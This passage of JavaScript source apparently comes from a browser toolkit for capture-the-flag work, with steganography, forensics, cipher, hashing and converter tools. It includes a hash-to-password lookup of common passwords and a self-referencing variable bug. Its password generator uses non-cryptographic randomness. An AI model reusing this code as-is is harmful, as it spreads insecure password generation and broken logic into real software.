    let result = `<strong>String Extraction Analysis:</strong>\n\n`;
    
    try {
        const base64Data = dataUrl.split(',')[1];
        const binaryString = atob(base64Data);
        
        // Extract different types of strings
        result += extractPrintableStrings(binaryString, 'Printable ASCII');
        result += extractUnicodeStrings(binaryString, 'Unicode');
        result += extractBase64Strings(binaryString, 'Base64 Encoded');
        result += extractURLs(binaryString, 'URLs');
        result += extractEmailAddresses(binaryString, 'Email Addresses');
        
    } catch (e) {
        result += `Error extracting strings: ${e.message}\n`;
    }
    
    return result;
}

function extractPrintableStrings(data, type) {
    const minLength = 4;
    const strings = [];
    let currentString = '';
    
    for (let i = 0; i < data.length; i++) {
        const code = data.charCodeAt(i);
        if (code >= 32 && code <= 126) {
            currentString += data.charAt(i);
        } else {
            if (currentString.length >= minLength) {
                strings.push(currentString);
            }
            currentString = '';
        }
    }
    
    if (currentString.length >= minLength) {
        strings.push(currentString);
    }
    
    let result = `<strong>${type} Strings (${strings.length} found):</strong>\n`;
    if (strings.length > 0) {
        strings.slice(0, 15).forEach((str, index) => {
            result += `${(index + 1).toString().padStart(2, '0')}. ${str}\n`;
        });
        if (strings.length > 15) {
            result += `... and ${strings.length - 15} more\n`;
        }
    } else {
        result += 'No strings found.\n';
    }
    result += '\n';
    
    return result;
}

function extractUnicodeStrings(data, type) {
    let result = `<strong>${type} Strings:</strong>\n`;
    
    // Look for UTF-16 encoded strings (common in Windows executables)
    const utf16Strings = [];
    for (let i = 0; i < data.length - 7; i += 2) {
        if (data.charCodeAt(i + 1) === 0) {
            let str = '';
            let j = i;
            while (j < data.length - 1 && data.charCodeAt(j + 1) === 0) {
                const char = data.charAt(j);
                if (char.charCodeAt(0) >= 32 && char.charCodeAt(0) <= 126) {
                    str += char;
                } else {
                    break;
                }
                j += 2;
            }
            if (str.length >= 4) {
                utf16Strings.push(str);
                i = j;
            }
        }
    }
    
    if (utf16Strings.length > 0) {
        result += `Found ${utf16Strings.length} UTF-16 string(s):\n`;
        utf16Strings.slice(0, 10).forEach((str, index) => {
            result += `${index + 1}. ${str}\n`;
        });
    } else {
        result += 'No UTF-16 strings found.\n';
    }
    result += '\n';
    
    return result;
}

function extractBase64Strings(data, type) {
    let result = `<strong>${type} Strings:</strong>\n`;
    
    const base64Regex = /[A-Za-z0-9+\/]{20,}={0,2}/g;
    const matches = data.match(base64Regex);
    
    if (matches && matches.length > 0) {
        result += `Found ${matches.length} potential Base64 string(s):\n`;
        matches.slice(0, 5).forEach((match, index) => {
            try {
                const decoded = atob(match);
                result += `${index + 1}. ${match.substring(0, 30)}... -> ${decoded.substring(0, 30)}...\n`;
            } catch (e) {
                result += `${index + 1}. ${match.substring(0, 30)}... (invalid Base64)\n`;
            }
        });
    } else {
        result += 'No Base64 strings found.\n';
    }
    result += '\n';
    
    return result;
}

function extractURLs(data, type) {
    let result = `<strong>${type}:</strong>\n`;
    
    const urlRegex = /https?:\/\/[^\s]+/g;
    const matches = data.match(urlRegex);
    
    if (matches && matches.length > 0) {
        result += `Found ${matches.length} URL(s):\n`;
        [...new Set(matches)].slice(0, 10).forEach((url, index) => {
            result += `${index + 1}. ${url}\n`;
        });
    } else {
        result += 'No URLs found.\n';
    }
    result += '\n';
    
    return result;
}

function extractEmailAddresses(data, type) {
    let result = `<strong>${type}:</strong>\n`;
    
    const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
    const matches = data.match(emailRegex);
    
    if (matches && matches.length > 0) {
        result += `Found ${matches.length} email address(es):\n`;
        [...new Set(matches)].slice(0, 10).forEach((email, index) => {
            result += `${index + 1}. ${email}\n`;
        });
    } else {
        result += 'No email addresses found.\n';
    }
    result += '\n';
    
    return result;
}

function performVisualAnalysis(ctx, width, height, container) {
    let result = `<strong>Visual Analysis:</strong>\n\n`;
    
    // Get image data
    const imageData = ctx.getImageData(0, 0, width, height);
    const data = imageData.data;
    
    // Color distribution analysis
    result += analyzeColorDistribution(data);
    
    // Entropy analysis per channel
    result += analyzeChannelEntropy(data);
    
    // Pattern detection
    result += detectVisualPatterns(data, width, height);
    
    // Create multiple visualizations
    createVisualAnalysisCanvas(data, width, height, container);
    result += `\nVisual analysis charts displayed below.\n`;
    
    return result;
}

function analyzeColorDistribution(data) {
    let result = `<strong>Color Distribution Analysis:</strong>\n`;
    
    const redHist = new Array(256).fill(0);
    const greenHist = new Array(256).fill(0);
    const blueHist = new Array(256).fill(0);
    
    for (let i = 0; i < data.length; i += 4) {
        redHist[data[i]]++;
        greenHist[data[i + 1]]++;
        blueHist[data[i + 2]]++;
    }
    
    const totalPixels = data.length / 4;
    
    // Find peaks and unusual distributions
    const redPeaks = findHistogramPeaks(redHist);
    const greenPeaks = findHistogramPeaks(greenHist);
    const bluePeaks = findHistogramPeaks(bluePeaks);
    
    result += `Total Pixels: ${totalPixels.toLocaleString()}\n`;
    result += `Red Channel Peaks: ${redPeaks.length} (at values: ${redPeaks.slice(0, 5).join(', ')})\n`;
    result += `Green Channel Peaks: ${greenPeaks.length} (at values: ${greenPeaks.slice(0, 5).join(', ')})\n`;
    result += `Blue Channel Peaks: ${bluePeaks.length} (at values: ${bluePeaks.slice(0, 5).join(', ')})\n\n`;
    
    return result;
}

function findHistogramPeaks(histogram) {
    const peaks = [];
    const threshold = Math.max(...histogram) * 0.1; // 10% of max
    
    for (let i = 1; i < histogram.length - 1; i++) {
        if (histogram[i] > threshold && 
            histogram[i] > histogram[i - 1] && 
            histogram[i] > histogram[i + 1]) {
            peaks.push(i);
        }
    }
    
    return peaks;
}

function analyzeChannelEntropy(data) {
    let result = `<strong>Channel Entropy Analysis:</strong>\n`;
    
    const channels = [[], [], []]; // R, G, B
    
    for (let i = 0; i < data.length; i += 4) {
        channels[0].push(data[i]);
        channels[1].push(data[i + 1]);
        channels[2].push(data[i + 2]);
    }
    
    const channelNames = ['Red', 'Green', 'Blue'];
    channels.forEach((channel, index) => {
        const entropy = calculateChannelEntropy(channel);
        result += `${channelNames[index]} Channel Entropy: ${entropy.toFixed(4)} `;
        if (entropy < 6.0) {
            result += '(Low - possible hidden data)\n';
        } else if (entropy > 7.5) {
            result += '(High - natural/random)\n';
        } else {
            result += '(Medium - normal range)\n';
        }
    });
    
    result += '\n';
    return result;
}

function calculateChannelEntropy(channel) {
    const histogram = new Array(256).fill(0);
    channel.forEach(value => histogram[value]++);
    
    const total = channel.length;
    let entropy = 0;
    
    histogram.forEach(count => {
        if (count > 0) {
            const p = count / total;
            entropy -= p * Math.log2(p);
        }
    });
    
    return entropy;
}

function detectVisualPatterns(data, width, height) {
    let result = `<strong>Pattern Detection:</strong>\n`;
    
    // Check for repeating patterns
    const sampleSize = Math.min(1000, data.length / 4);
    const patterns = [];
    
    // Look for identical pixel sequences
    const pixelMap = new Map();
    for (let i = 0; i < sampleSize * 4; i += 4) {
        const pixel = `${data[i]},${data[i + 1]},${data[i + 2]}`;
        pixelMap.set(pixel, (pixelMap.get(pixel) || 0) + 1);
    }
    
    // Find most common pixels
    const sortedPixels = [...pixelMap.entries()].sort((a, b) => b[1] - a[1]);
    const topPixels = sortedPixels.slice(0, 5);
    
    result += `Most Common Pixel Colors:\n`;
    topPixels.forEach(([pixel, count], index) => {
        const percentage = ((count / sampleSize) * 100).toFixed(2);
        result += `${index + 1}. RGB(${pixel}) - ${count} occurrences (${percentage}%)\n`;
    });
    
    // Check for unusual uniformity
    const uniformityThreshold = 0.1;
    if (topPixels.length > 0 && topPixels[0][1] / sampleSize > uniformityThreshold) {
        result += `⚠️ High color uniformity detected - possible steganography!\n`;
    }
    
    result += '\n';
    return result;
}

function createVisualAnalysisCanvas(data, width, height, container) {
    container.innerHTML = '';
    
    // Create histogram canvas
    const histCanvas = document.createElement('canvas');
    histCanvas.width = 768;
    histCanvas.height = 256;
    histCanvas.style.border = '1px solid #ccc';
    histCanvas.style.background = '#1a1a2e';
    
    const histCtx = histCanvas.getContext('2d');
    drawColorHistogram(histCtx, data);
    
    const title = document.createElement('h4');
    title.textContent = 'RGB Color Distribution Histogram';
    title.style.color = '#ffffff';
    title.style.marginTop = '1rem';
    
    container.appendChild(title);
    container.appendChild(histCanvas);
}

function drawColorHistogram(ctx, data) {
    const redHist = new Array(256).fill(0);
    const greenHist = new Array(256).fill(0);
    const blueHist = new Array(256).fill(0);
    
    // Calculate histograms
    for (let i = 0; i < data.length; i += 4) {
        redHist[data[i]]++;
        greenHist[data[i + 1]]++;
        blueHist[data[i + 2]]++;
    }
    
    // Find max value for normalization
    const maxVal = Math.max(...redHist, ...greenHist, ...blueHist);
    
    // Clear canvas
    ctx.fillStyle = '#1a1a2e';
    ctx.fillRect(0, 0, 768, 256);
    
    // Draw histograms
    const barWidth = 768 / 256;
    
    // Red channel
    ctx.fillStyle = 'rgba(255, 0, 0, 0.7)';
    for (let i = 0; i < 256; i++) {
        const height = (redHist[i] / maxVal) * 250;
        ctx.fillRect(i * barWidth, 256 - height, barWidth, height);
    }
    
    // Green channel
    ctx.fillStyle = 'rgba(0, 255, 0, 0.7)';
    for (let i = 0; i < 256; i++) {
        const height = (greenHist[i] / maxVal) * 250;
        ctx.fillRect(i * barWidth, 256 - height, barWidth, height);
    }
    
    // Blue channel
    ctx.fillStyle = 'rgba(0, 0, 255, 0.7)';
    for (let i = 0; i < 256; i++) {
        const height = (blueHist[i] / maxVal) * 250;
        ctx.fillRect(i * barWidth, 256 - height, barWidth, height);
    }
    
    // Add labels
    ctx.fillStyle = '#ffffff';
    ctx.font = '12px Arial';
    ctx.fillText('0', 5, 250);
    ctx.fillText('255', 730, 250);
    ctx.fillText('Red', 20, 20);
    ctx.fillText('Green', 70, 20);
    ctx.fillText('Blue', 130, 20);
}

function performLSBAnalysis(ctx, width, height) {
    const imageData = ctx.getImageData(0, 0, width, height);
    const data = imageData.data;
    let result = 'LSB Analysis Results:\n\n';

    // Sample LSB extraction from first 100 pixels
    let extractedBits = '';
    for (let i = 0; i < Math.min(400, data.length); i += 4) {
        extractedBits += (data[i] & 1).toString(); // Red channel LSB
    }

    result += `Extracted LSBs (first 100 pixels): ${extractedBits}\n`;
    result += `Potential ASCII: ${binaryToAscii(extractedBits)}\n`;

    return result;
}

function binaryToAscii(binary) {
    let result = '';
    for (let i = 0; i < binary.length; i += 8) {
        const byte = binary.substr(i, 8);
        if (byte.length === 8) {
            const ascii = parseInt(byte, 2);
            if (ascii >= 32 && ascii <= 126) {
                result += String.fromCharCode(ascii);
            } else {
                result += '.';
            }
        }
    }
    return result;
}

// Binary converter functions
function textToBinary() {
    const text = document.getElementById('binaryInput').value;
    const output = document.getElementById('binaryOutput');

    const binary = text.split('').map(char => 
        char.charCodeAt(0).toString(2).padStart(8, '0')
    ).join(' ');

    output.textContent = binary;
    showMessage('Text converted to binary!', 'success');
}

function binaryToText() {
    const binary = document.getElementById('binaryInput').value.replace(/\s+/g, '');
    const output = document.getElementById('binaryOutput');

    if (!binary) {
        showMessage('Please enter binary data', 'error');
        return;
    }

    if (!/^[01]*$/.test(binary)) {
        output.textContent = 'Error: Invalid binary characters';
        showMessage('Conversion failed! Use only 0 and 1', 'error');
        return;
    }

    if (binary.length % 8 !== 0) {
        output.textContent = 'Error: Binary length must be multiple of 8';
        showMessage('Conversion failed! Add padding zeros', 'error');
        return;
    }

    try {
        const text = binary.match(/.{1,8}/g)
            .map(byte => String.fromCharCode(parseInt(byte, 2)))
            .join('');
        output.textContent = text;
        showMessage('Binary converted to text!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid binary input';
        showMessage('Conversion failed!', 'error');
    }
}

function textToDecimal() {
    const text = document.getElementById('binaryInput').value;
    const output = document.getElementById('binaryOutput');

    const decimal = text.split('').map(char => char.charCodeAt(0)).join(' ');
    output.textContent = decimal;
    showMessage('Text converted to decimal!', 'success');
}

function decimalToText() {
    const decimal = document.getElementById('binaryInput').value;
    const output = document.getElementById('binaryOutput');

    try {
        const text = decimal.split(/\s+/).map(num => String.fromCharCode(parseInt(num))).join('');
        output.textContent = text;
        showMessage('Decimal converted to text!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid decimal input';
        showMessage('Conversion failed!', 'error');
    }
}

// Password generator functions
function generatePasswords() {
    const length = parseInt(document.getElementById('passLength').value);
    const count = parseInt(document.getElementById('passCount').value);
    const includeUpper = document.getElementById('includeUpper').checked;
    const includeLower = document.getElementById('includeLower').checked;
    const includeNumbers = document.getElementById('includeNumbers').checked;
    const includeSymbols = document.getElementById('includeSymbols').checked;
    const output = document.getElementById('passwordOutput');

    let charset = '';
    if (includeUpper) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (includeLower) charset += 'abcdefghijklmnopqrstuvwxyz';
    if (includeNumbers) charset += '0123456789';
    if (includeSymbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';

    if (!charset) {
        showMessage('Please select at least one character set', 'error');
        return;
    }

    let passwords = [];
    for (let i = 0; i < count; i++) {
        let password = '';
        for (let j = 0; j < length; j++) {
            password += charset.charAt(Math.floor(Math.random() * charset.length));
        }
        passwords.push(password);
    }

    output.innerHTML = `<pre>${passwords.join('\n')}</pre>`;
    showMessage('Passwords generated successfully!', 'success');
}

// File forensics functions
function analyzeFile() {
    const fileInput = document.getElementById('forensicsFile');
    const analysisType = document.getElementById('forensicsType').value;
    const output = document.getElementById('forensicsOutput');

    if (!fileInput.files[0]) {
        showMessage('Please upload a file', 'error');
        return;
    }

    const file = fileInput.files[0];
    const reader = new FileReader();

    reader.onload = function(e) {
        const arrayBuffer = e.target.result;
        const uint8Array = new Uint8Array(arrayBuffer);

        let result = `<strong>File Forensics Analysis - ${analysisType.toUpperCase()}</strong>\n\n`;
        result += `File: ${file.name}\nSize: ${file.size} bytes\nType: ${file.type}\n\n`;

        switch(analysisType) {
            case 'header':
                result += analyzeFileHeader(uint8Array);
                break;
            case 'strings':
                result += extractStrings(uint8Array);
                break;
            case 'metadata':
                result += 'Metadata analysis would extract EXIF, creation dates, etc.';
                break;
            case 'entropy':
                result += calculateEntropy(uint8Array);
                break;
        }

        output.innerHTML = `<pre>${result}</pre>`;
        showMessage('File analysis completed!', 'success');
    };
    reader.readAsArrayBuffer(file);
}

function analyzeFileHeader(uint8Array) {
    const header = Array.from(uint8Array.slice(0, 16))
        .map(b => b.toString(16).padStart(2, '0'))
        .join(' ');

    const signatures = {
        '89 50 4e 47': 'PNG Image',
        'ff d8 ff': 'JPEG Image',
        '47 49 46 38': 'GIF Image',
        '50 4b 03 04': 'ZIP Archive',
        '52 61 72 21': 'RAR Archive',
        '25 50 44 46': 'PDF Document'
    };

    let fileType = 'Unknown';
    for (let sig in signatures) {
        if (header.startsWith(sig)) {
            fileType = signatures[sig];
            break;
        }
    }

    return `File Header Analysis:\nHex: ${header}\nDetected Type: ${fileType}\n\n`;
}

function extractStrings(uint8Array) {
    const minLength = 4;
    const strings = [];
    let currentString = '';

    for (let i = 0; i < uint8Array.length; i++) {
        const byte = uint8Array[i];
        if (byte >= 32 && byte <= 126) {
            currentString += String.fromCharCode(byte);
        } else {
            if (currentString.length >= minLength) {
                strings.push(currentString);
            }
            currentString = '';
        }
    }

    return `Extracted Strings (${strings.length} found):\n${strings.slice(0, 20).join('\n')}\n${strings.length > 20 ? '...(truncated)' : ''}\n\n`;
}

function calculateEntropy(uint8Array) {
    const freq = new Array(256).fill(0);
    for (let byte of uint8Array) {
        freq[byte]++;
    }

    let entropy = 0;
    const length = uint8Array.length;
    for (let count of freq) {
        if (count > 0) {
            const p = count / length;
            entropy -= p * Math.log2(p);
        }
    }

    return `Entropy Analysis:\nCalculated Entropy: ${entropy.toFixed(4)} bits\nFile appears to be: ${entropy > 7.5 ? 'Encrypted/Compressed' : 'Plain text/Low entropy'}\n\n`;
}

// QR Code functions
function decodeQR() {
    const fileInput = document.getElementById('qrFile');
    const output = document.getElementById('qrOutput');

    if (!fileInput.files[0]) {
        showMessage('Please upload a QR code image', 'error');
        return;
    }

    const file = fileInput.files[0];
    const reader = new FileReader();

    reader.onload = function(e) {
        const img = new Image();
        img.onload = function() {
            try {
                // Simulate QR decoding (would need a real QR library)
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = img.width;
                canvas.height = img.height;
                ctx.drawImage(img, 0, 0);

                let result = `QR Code Analysis:\n\n`;
                result += `Image Size: ${img.width}x${img.height}\n`;
                result += `File Size: ${file.size} bytes\n\n`;
                result += `Note: This is a simulated decoder. For real QR decoding, use:\n`;
                result += `• Online QR readers (qr-code-generator.com)\n`;
                result += `• Mobile QR scanner apps\n`;
                result += `• Browser extensions\n`;
                result += `• Command line tools like zbar\n\n`;
                result += `Common QR Content Types:\n`;
                result += `• URLs (http://example.com)\n`;
                result += `• Text messages\n`;
                result += `• WiFi credentials\n`;
                result += `• Contact information (vCard)\n`;
                result += `• Geographic coordinates\n`;

                output.textContent = result;
                showMessage('QR analysis completed (simulated)', 'info');
            } catch (error) {
                output.textContent = `Error analyzing QR code: ${error.message}`;
                showMessage('QR analysis failed', 'error');
            }
        };
        img.src = e.target.result;
    };
    reader.readAsDataURL(file);
}

function generateQR() {
    const input = document.getElementById('qrInput').value;
    const output = document.getElementById('qrOutput');
    const display = document.getElementById('qrDisplay');

    if (!input.trim()) {
        showMessage('Please enter data to encode', 'error');
        return;
    }

    // Simulate QR generation
    let result = `QR Code Generation:\n\n`;
    result += `Input Data: ${input}\n`;
    result += `Data Length: ${input.length} characters\n`;
    result += `Encoding: UTF-8\n\n`;
    result += `Generated QR Code Properties:\n`;
    result += `• Error Correction: M (15%)\n`;
    result += `• Version: Auto-selected\n`;
    result += `• Module Size: 4px\n\n`;
    result += `Note: Use online QR generators for actual QR codes:\n`;
    result += `• qr-code-generator.com\n`;
    result += `• qr.io\n`;
    result += `• Google Charts API\n`;

    // Create a simple visual representation
    const qrSize = Math.min(200, Math.max(100, input.length * 2));
    display.innerHTML = `
        <div style="width: ${qrSize}px; height: ${qrSize}px; background: #000; margin: 1rem auto; border: 1px solid #ccc; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 12px; text-align: center;">
            QR Code<br>Placeholder<br>${input.substring(0, 20)}${input.length > 20 ? '...' : ''}
        </div>
    `;

    output.textContent = result;
    showMessage('QR code generation simulated', 'info');
}

// Brainfuck interpreter
function executeBrainfuck() {
    const code = document.getElementById('bfCode').value;
    const input = document.getElementById('bfInput').value;
    const output = document.getElementById('bfOutput');

    if (!code.trim()) {
        showMessage('Please enter Brainfuck code', 'error');
        return;
    }

    try {
        const result = interpretBrainfuck(code, input);
        output.innerHTML = `<pre>Output: ${result.output}\n\nExecution Details:\nInstructions executed: ${result.instructions}\nMemory used: ${result.memory} cells\nExecution time: ${result.time}ms</pre>`;
        showMessage('Brainfuck executed successfully!', 'success');
    } catch (error) {
        output.textContent = `Error: ${error.message}`;
        showMessage('Execution failed!', 'error');
    }
}

function interpretBrainfuck(code, input) {
    const startTime = Date.now();
    const memory = new Array(30000).fill(0);
    let pointer = 0;
    let codePointer = 0;
    let inputPointer = 0;
    let output = '';
    let instructions = 0;
    const maxInstructions = 1000000; // Prevent infinite loops

    while (codePointer < code.length && instructions < maxInstructions) {
        const command = code[codePointer];
        instructions++;

        switch (command) {
            case '>':
                pointer = (pointer + 1) % memory.length;
                break;
            case '<':
                pointer = (pointer - 1 + memory.length) % memory.length;
                break;
            case '+':
                memory[pointer] = (memory[pointer] + 1) % 256;
                break;
            case '-':
                memory[pointer] = (memory[pointer] - 1 + 256) % 256;
                break;
            case '.':
                output += String.fromCharCode(memory[pointer]);
                break;
            case ',':
                if (inputPointer < input.length) {
                    memory[pointer] = input.charCodeAt(inputPointer++);
                } else {
                    memory[pointer] = 0;
                }
                break;
            case '[':
                if (memory[pointer] === 0) {
                    let depth = 1;
                    while (depth > 0 && codePointer < code.length - 1) {
                        codePointer++;
                        if (code[codePointer] === '[') depth++;
                        if (code[codePointer] === ']') depth--;
                    }
                }
                break;
            case ']':
                if (memory[pointer] !== 0) {
                    let depth = 1;
                    while (depth > 0 && codePointer > 0) {
                        codePointer--;
                        if (code[codePointer] === ']') depth++;
                        if (code[codePointer] === '[') depth--;
                    }
                }
                break;
        }
        codePointer++;
    }

    const maxUsedMemory = memory.findIndex((val, idx) => idx > pointer || val !== 0);
    
    return {
        output: output || '(no output)',
        instructions,
        memory: maxUsedMemory === -1 ? pointer + 1 : Math.max(pointer + 1, maxUsedMemory + 1),
        time: Date.now() - startTime
    };
}

function loadBFExample() {
    document.getElementById('bfCode').value = '++++++++++[>+++++++>++++++++++>+++>+<<<<-]>++.>+.+++++++..+++.>++.<<+++++++++++++++.>.+++.------.--------.>+.';
    document.getElementById('bfInput').value = '';
    showMessage('Hello World example loaded', 'info');
}

// Barcode decoder
function decodeBarcode() {
    const fileInput = document.getElementById('barcodeFile');
    const barcodeType = document.getElementById('barcodeType').value;
    const output = document.getElementById('barcodeOutput');

    if (!fileInput.files[0]) {
        showMessage('Please upload a barcode image', 'error');
        return;
    }

    const file = fileInput.files[0];
    const reader = new FileReader();

    reader.onload = function(e) {
        const img = new Image();
        img.onload = function() {
            let result = `Barcode Analysis:\n\n`;
            result += `File: ${file.name}\n`;
            result += `Size: ${file.size} bytes\n`;
            result += `Image Dimensions: ${img.width}x${img.height}\n`;
            result += `Selected Type: ${barcodeType}\n\n`;
            
            result += `Note: This is a simulated decoder. For real barcode decoding:\n\n`;
            result += `Online Tools:\n`;
            result += `• online-barcode-reader.inliteresearch.com\n`;
            result += `• zxing.org/w/decode\n`;
            result += `• aspose.app/barcode/recognize\n\n`;
            
            result += `Mobile Apps:\n`;
            result += `• Google Lens\n`;
            result += `• ZXing Barcode Scanner\n`;
            result += `• QR & Barcode Reader\n\n`;
            
            result += `Command Line Tools:\n`;
            result += `• zbar (Linux/macOS)\n`;
            result += `• ZXing command line\n\n`;
            
            result += `Common Barcode Types:\n`;
            result += `• Code 128: Variable length, alphanumeric\n`;
            result += `• Code 39: Fixed length, alphanumeric\n`;
            result += `• EAN-13: 13-digit product codes\n`;
            result += `• UPC: Universal Product Code\n`;
            result += `• QR Code: 2D matrix barcode\n`;

            output.textContent = result;
            showMessage('Barcode analysis completed (simulated)', 'info');
        };
        img.src = e.target.result;
    };
    reader.readAsDataURL(file);
}

// Event listeners for dynamic UI updates
document.addEventListener('DOMContentLoaded', function() {
    // Wordlist selection handler
    document.addEventListener('change', function(e) {
        if (e.target.id === 'wordlist') {
            const customGroup = document.getElementById('customWordlistGroup');
            if (customGroup) {
                customGroup.style.display = e.target.value === 'custom' ? 'block' : 'none';
            }
        }
        
        // Attack mode selection handler
        if (e.target.id === 'attackMode') {
            const maskGroup = document.getElementById('maskGroup');
            if (maskGroup) {
                maskGroup.style.display = e.target.value === 'mask' ? 'block' : 'none';
            }
        }
    });
});

// Keyboard shortcuts
document.addEventListener('keydown', function(e) {
    // Close modal with Escape key
    if (e.key === 'Escape') {
        closeModal();
    }

    // Quick tool access with Ctrl + number
    if (e.ctrlKey && e.key >= '1' && e.key <= '6') {
        const sections = ['dashboard', 'crypto', 'web', 'forensics', 'reverse', 'pwn'];
        const sectionIndex = parseInt(e.key) - 1;
        if (sections[sectionIndex]) {
            document.querySelector(`[data-section="${sections[sectionIndex]}"]`).click();
        }
    }
});

// Initialize tooltips and other UI enhancements
document.addEventListener('DOMContentLoaded', function() {
    // Add loading states to buttons
    const buttons = document.querySelectorAll('.btn');
    buttons.forEach(button => {
        button.addEventListener('click', function() {
            const originalText = this.textContent;
            this.innerHTML = '<span class="loading"></span> Processing...';
            this.disabled = true;

            setTimeout(() => {
                this.textContent = originalText;
                this.disabled = false;
            }, 1000);
        });
    });

    // Search functionality will be added in future updates

    console.log('CTF Arsenal Platform Loaded Successfully!');
});

// Cipher functions
function applyCipher(cipherType) {
    const input = document.getElementById('cipherInput').value;
    const output = document.getElementById('cipherOutput');

    let result = '';
    switch (cipherType) {
        case 'rot13':
            result = rot13(input);
            break;
        case 'atbash':
            result = atbash(input);
            break;
        default:
            result = 'Cipher not supported.';
    }

    output.textContent = result;
    showMessage(`Cipher applied: ${cipherType}`, 'success');
}

function clearCipher() {
    document.getElementById('cipherInput').value = '';
    document.getElementById('cipherOutput').textContent = '';
}

function rot13(text) {
    return text.replace(/[a-zA-Z]/g, function(char) {
        const start = char <= 'Z' ? 65 : 97;
        const code = char.charCodeAt(0);
        let shifted = ((code - start + 13) % 26) + start;
        return String.fromCharCode(shifted);
    });
}

function atbash(text) {
    return text.replace(/[a-zA-Z]/g, function(char) {
        const start = char <= 'Z' ? 65 : 97;
        const code = char.charCodeAt(0);
        let atbashCode = start + 25 - (code - start);
        return String.fromCharCode(atbashCode);
    });
}

// ASCII conversion functions
function textToAscii() {
    const text = document.getElementById('asciiInput').value;
    const output = document.getElementById('asciiOutput');

    const ascii = text.split('').map(char => char.charCodeAt(0)).join(' ');
    output.textContent = ascii;
    showMessage('Text converted to ASCII!', 'success');
}

function asciiToText() {
    const ascii = document.getElementById('asciiInput').value;
    const output = document.getElementById('asciiOutput');

    try {
        const text = ascii.split(' ').map(code => String.fromCharCode(code)).join('');
        output.textContent = text;
        showMessage('ASCII converted to text!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid ASCII input';
        showMessage('Conversion failed!', 'error');
    }
}

// Specific hash functions
async function generateSpecificHash() {
    const text = document.getElementById('hashTextInput').value;
    const hashType = document.getElementById('selectedHashType').value;
    const output = document.getElementById('specificHashOutput');

    if (!text) {
        showMessage('Please enter text to hash', 'error');
        return;
    }

    try {
        const encoder = new TextEncoder();
        const data = encoder.encode(text);
        let hashBuffer;

        switch(hashType) {
            case 'md5':
                if (typeof CryptoJS !== 'undefined') {
                    output.textContent = CryptoJS.MD5(text).toString();
                } else {
                    output.textContent = 'CryptoJS not available for MD5';
                    showMessage('CryptoJS library not loaded', 'error');
                    return;
                }
                break;
            case 'sha1':
                hashBuffer = await crypto.subtle.digest('SHA-1', data);
                break;
            case 'sha256':
                hashBuffer = await crypto.subtle.digest('SHA-256', data);
                break;
            case 'sha512':
                hashBuffer = await crypto.subtle.digest('SHA-512', data);
                break;
        }

        if (hashType !== 'md5' && hashBuffer) {
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            output.textContent = hashHex;
        }

        showMessage(`${hashType.toUpperCase()} hash generated successfully!`, 'success');
    } catch (error) {
        output.textContent = `Error generating hash: ${error.message}`;
        showMessage('Hash generation failed!', 'error');
    }
}

// Rainbow table lookup function
function rainbowLookup() {
    const hash = document.getElementById('rainbowHash').value.trim().toLowerCase();
    const output = document.getElementById('rainbowOutput');

    if (!hash) {
        showMessage('Please enter a hash', 'error');
        return;
    }

    // Simulated rainbow table with common hashes
    const rainbowTable = {
        // MD5 hashes
        '5d41402abc4b2a76b9719d911017c592': 'hello',
        '098f6bcd4621d373cade4e832627b4f6': 'test',
        'e99a18c428cb38d5f260853678922e03': 'abc123',
        '25d55ad283aa400af464c76d713c07ad': 'hello world',
        '202cb962ac59075b964b07152d234b70': '123',
        '5ebe2294ecd0e0f08eab7690d2a6ee69': 'secret',
        '21232f297a57a5a743894a0e4a801fc3': 'admin',
        '482c811da5d5b4bc6d497ffa98491e38': 'password123',
        // SHA1 hashes
        'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d': 'hello',
        'a94a8fe5ccb19ba61c4c0873d391e987982fbbd3': 'test',
        '356a192b7913b04c54574d18c28d46e6395428ab': '1',
        'da39a3ee5e6b4b0d3255bfef95601890afd80709': '', // empty string
        '2ef7bde608ce5404e97d5f042f95f89f1c232871': 'hello world'
    };

    let result = `<strong>Rainbow Table Lookup:</strong>\n\nHash: ${hash}\n\n`;

    if (rainbowTable[hash]) {
        result += `<strong style="color: #4caf50;">FOUND!</strong>\nPlaintext: ${rainbowTable[hash]}\n\nThis hash was found in our simulated rainbow table.`;
        showMessage('Hash found in rainbow table!', 'success');
    } else {
        result += `<strong style="color: #f44336;">NOT FOUND</strong>\n\nThis hash was not found in our rainbow table.\n\nNote: This is a simulated rainbow table with limited entries.\nReal rainbow tables contain millions of hash-plaintext pairs.`;
        showMessage('Hash not found in rainbow table', 'error');
    }

    output.innerHTML = `<pre>${result}</pre>`;
}

// Metadata extraction function
function extractMetadata() {
    const fileInput = document.getElementById('metadataFile');
    const output = document.getElementById('metadataOutput');

    if (!fileInput.files[0]) {
        showMessage('Please upload a file', 'error');
        return;
    }

    const file = fileInput.files[0];
    let result = `<strong>File Metadata:</strong>\n\n`;
    result += `File Name: ${file.name}\n`;
    result += `File Size: ${file.size} bytes (${(file.size / 1024).toFixed(2)} KB)\n`;
    result += `File Type: ${file.type || 'Unknown'}\n`;
    result += `Last Modified: ${new Date(file.lastModified).toLocaleString()}\n\n`;

    // Basic file signature analysis
    const reader = new FileReader();
    reader.onload = function(e) {
        const arrayBuffer = e.target.result;
        const uint8Array = new Uint8Array(arrayBuffer);
        const header = Array.from(uint8Array.slice(0, 16))
            .map(b => b.toString(16).padStart(2, '0'))
            .join(' ');

        result += `File Header (hex): ${header}\n`;

        // File type detection based on magic numbers
        const signatures = {
            '89 50 4e 47': 'PNG Image',
            'ff d8 ff': 'JPEG Image',
            '47 49 46 38': 'GIF Image (GIF87a/89a)',
            '50 4b 03 04': 'ZIP Archive',
            '50 4b 05 06': 'ZIP Archive (empty)',
            '50 4b 07 08': 'ZIP Archive (spanned)',
            '52 61 72 21': 'RAR Archive',
            '25 50 44 46': 'PDF Document',
            '4d 5a': 'Windows Executable (PE)',
            '7f 45 4c 46': 'Linux Executable (ELF)',
            'ca fe ba be': 'Java Class File',
            'ff fb': 'MP3 Audio',
            '49 44 33': 'MP3 Audio with ID3v2',
